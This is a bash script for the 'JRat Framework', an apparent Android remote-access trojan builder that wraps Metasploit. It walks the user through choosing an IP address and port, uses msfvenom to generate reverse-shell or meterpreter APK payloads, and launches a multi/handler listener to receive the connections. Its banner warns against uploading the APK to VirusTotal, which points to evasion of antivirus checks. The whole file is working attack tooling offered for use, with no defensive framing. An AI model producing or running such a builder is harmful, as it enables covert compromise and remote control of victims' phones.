#!/usr/bin/env bash

#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
# resize terminal window
resize -s 30 52 > /dev/null
# Check root
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "Kamu harus menjalankannya dengan root"; echo ; exit 1; }
clear
# check internet
function checkinternet()
{
  ping -c 1 google.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow "Checking For Internet: ${RedF}FAILED"
    echo
    echo -e $red "This Script Needs An Active Internet Connection"
    echo
    echo -e $yellow "JRat Exit"
    echo && sleep 2
    exit
  else
    echo -e $yellow "Checking For Internet: ${LighGreenF}CONNECTED"
  fi
}
checkinternet
sleep 2
#Define options
path=`pwd`
lanip=`ifconfig | grep "inet " | grep -Fv 127.0.0.1 | awk '{print $2}'`
publicip=`curl -s whatismyip.akamai.com`
ver="v0x01"

echo ""
sleep 1
# check ID
idbase=`cat /etc/os-release | grep "ID=" | cut -d '=' -f 2`
#check dependencies existence
echo -e $green "Checking dependencies configuration...${LighGreenF}"
# spinner for Metasploit Generator
spinlong ()
{
    bar="•••••••••••••••••••••••••••••••••••••••••••••••••"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
# check if metasploit-framework is installed
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[✔] Metasploit-Framework.................${LighGreenF}[ found ]"
which msfconsole > /dev/null 2>&1
sleep 2
else
echo -e $red "[x] Metasploit-Framework  -> ${RedF}not found "
echo -e $yellow "[!] Installing Metasploit-Framework "
  if [[ $idbase == 'arch' ]]; then
    pacman -S metasploit -y
    clear
  else
    sudo apt-get install metasploit-framework -y
    clear
fi
echo -e $blue "[✔] Done installing ...."
fi
# check if zenity is installed
which zenity > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[✔] Zenity...............................${LighGreenF}[ found ]"
which zenity > /dev/null 2>&1
sleep 2
else
echo -e $red "[x] Zenity  -> ${RedF}not found "
echo -e $yellow "[!] Installing Zenity "
  if [[ $idbase == 'arch' ]]; then
    pacman -S zenity -y
    clear
  else
    sudo apt-get install zenity -y
    clear
fi
echo -e $blue "[✔] Done installing ...."
fi
# check if apktool is installed
which apktool > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[✔] Apktool..............................${LighGreenF}[ found ]"
which apktool > /dev/null 2>&1
sleep 2
else
echo -e $red "[x] Apktool  -> ${RedF}not found "
echo -e $yellow "[!] Installing Apktool "
  if [[ $idbase == 'arch' ]]; then
    pacman -S android-apktool -y
    clear
  else
    sudo apt-get install apktool -y
    clear
fi
echo -e $blue "[✔] Done installing ...."
fi
# check if xterm is installed
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[✔] Xterm................................${LighGreenF}[ found ]"
which xterm > /dev/null 2>&1
sleep 2
else
echo -e $red "[x] Xterm  -> ${RedF}not found "
echo -e $yellow "[!] Installing Xterm "
  if [[ $idbase == 'arch' ]]; then
    pacman -S xterm -y
    clear
  else
    sudo apt-get install xterm -y
    clear
fi
echo -e $blue "[✔] Done installing ...."
fi
# check if Android Asset Packaging Tool is installed
which aapt > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[✔] Aapt.................................${LighGreenF}[ found ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo -e $red "[x] Aapt  -> ${RedF}not found "
echo -e $yellow "[!] Installing Aapt "
  if [[ $idbase == 'arch' ]]; then
    pacman -S android-tools android-sdk-platform-tools -y
    clear
  else
    sudo apt-get install aapt android-framework-res -y
    clear
fi
echo -e $blue "[✔] Done installing ...."
fi

#create directory crot
directory="$path/crot"
if [ ! -d "$directory" ]; then
	echo "Creating the crot directory..."
	mkdir $directory
        sleep 3
fi
echo -e $red "╔────────────────────────────────────────────────╗"
echo -e $red "|      JRat Framework $ver - codernate.org      |"
echo -e $red "|   Please do not upload APK to VirusTotal.com   |"
echo -e $red "┖────────────────────────────────────────────────┙"

#function lhost
function get_lhost()
{
  LHOST=$(zenity --title=" SET LHOST " --text "Your-Local-ip: $lanip ; Your-Public-ip: $publicip" --entry-text "$lanip" --entry --width 200 2> /dev/null)
}
#function lport
function get_lport()
{
  LPORT=$(zenity --title=" SET LPORT " --text "example: 1337" --entry-text "1337" --entry --width 200 2> /dev/null)
}
#function payload
function get_payload()
{
  PAYLOAD=$(zenity --list --title " JRat " --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 260 --height 360 2> /dev/null)
}
function get_payload1()
{
  PAYLOAD=$(zenity --list --title " JRat " --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 200 --height 400 2> /dev/null)
}
#function name
function payload_name()
{
 apk_name=$(zenity --title " PAYLOAD NAME " --text "example: JRoan" --entry --entry-text "JRoan" --width 200 2> /dev/null)
}

#function errors
function error()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【x】 Failed to rebuild backdoored apk【x】"
   echo
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}
function error0()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【x】 An Error Was Occured .Ty Again【x】"
   echo
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}
#function apache2 service
function apache_svc_start()
{
 systemctl start httpd | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start apache2 service" --percentage=0 --auto-close --width 200 > /dev/null 2>&1
}
function apache_svc_stop()
{
 systemctl stop httpd | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop apache2 service" --percentage=0 --auto-close --width 200 > /dev/null 2>&1
}
#function postgresql service
function postgresql_start()
{
 systemctl start postgresql | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start postgresql service" --percentage=0 --auto-close --width 200 > /dev/null 2>&1
}
function postgresql_stop()
{
 systemctl stop postgresql | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width 200 > /dev/null 2>&1
}
#function attack verctor
function atkv()
{
while true; do
   echo ""
   atk_v=$(zenity --list --title " JRat OPTIONS " --text "Choose an option bellow:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 200 --height 270 2> /dev/null)
   case $atk_v in
   Multi-Handler) listener;clear;main;;
   Attack-Vector) clns;spinlong;index_name;launcher;listener;;
   Main-Menu) clear;main;;
   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Sayonara, Sukur Dofu-dofu !!";echo "";exit;;
   esac
done
}
#function listeners
function listener()
{
  xfce4-terminal -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit -j'"
}
#function generate apk
function gen_payload()
{
 echo -e $yellow ""
 echo "[*] Generating apk payload"
 spinlong
 xterm -T " GENERATE APK PAYLOAD" -fa monaco -fs 10 -bg black -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}
#function clean files
function clean()
{
 rm $directory/* > /dev/null 2>&1
 rm $path/*.jpeg > /dev/null 2>&1
 rm $path/*.txt > /dev/null 2>&1
}
start=$(zenity --question --title=" JRat Framework " --text "Execute JRat Framework and Services?" --width 200 2> /dev/null)
  if [ "$?" -eq "0" ]; then
    apache_svc_start
    postgresql_start
  else
    clear
    echo ""
    echo -e $lightgreen "╔────────────────────────────────────────────────╗"
    echo -e $lightgreen "|      JRat Framework $ver - codernate.org      |"
    echo -e $lightgreen "|   Please do not upload APK to VirusTotal.com   |"
    echo -e $lightgreen "┖────────────────────────────────────────────────┙"
    echo ""
    apache_svc_stop
    postgresql_stop
    exit
  fi
clear

#main menu
function main()
{
    while :
    do
        echo ""
        echo ""
        echo -e $lightgreen "                      ▀▄   ▄▀              "
        echo -e $lightgreen "                     ▄█▀███▀█▄             "
        echo -e $lightgreen "                    █▀███████▀█            "
        echo -e $lightgreen "                    █ █▀▀▀▀▀█ █            "
        echo -e $lightgreen "                       ▀▀ ▀▀               "
        echo -e $red "╔────────────────────────────────────────────────╗"
        echo -e $red "|      JRat Framework $ver - codernate.org      |"
        echo -e $red "|   Please do not upload APK to VirusTotal.com   |"
        echo -e $red "┖────────────────────────────────────────────────┙"
        echo -e $green
        echo "[1] CREATE PAYLOAD                              "
        echo "[2] START LISTENER                              "
        echo "[c] CLEAN                                       "
        echo "[q] QUIT                                        "
        echo ""
        read -p "[?] Select>: " option
        echo

        case "$option" in
            1)  echo -e $lightgreen "[✔] APK MSF"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload
                echo
                spinlong
                gen_payload
                mv $apk_name.apk $path/crot > /dev/null 2>&1
                error0
                sleep 2
                echo ""
                zenity --title " JRat " --info --text "APK PAYLOAD : $path/crot/$apk_name.apk " --width 260 > /dev/null 2>&1
                atkv
                echo
                ;;
            2)  echo -e $lightgreen "[✔] Start Listener"
                echo -e $green
                get_lhost
                get_lport
                echo
                get_payload
                echo
                listener
                echo
                ;;
            c)  echo -e $lightgreen "[✔] clean up all files"
                echo
                clean
                echo
                zenity --title " Clean JRoan " --info --text "All Files Are Removed " --width 400 > /dev/null 2>&1
                echo
                clear
                ;;
            q)  echo -e $yellow " Sayonara, Sukur Dofu-dofu !!"
                apache_svc_stop
                postgresql_stop
                echo
                exit 0
                ;;
            *)  echo -e $red  "【x】 Invalid option, please write a valid number【x】"
                echo
                sleep 2
                ;;
        esac
    done
}
main
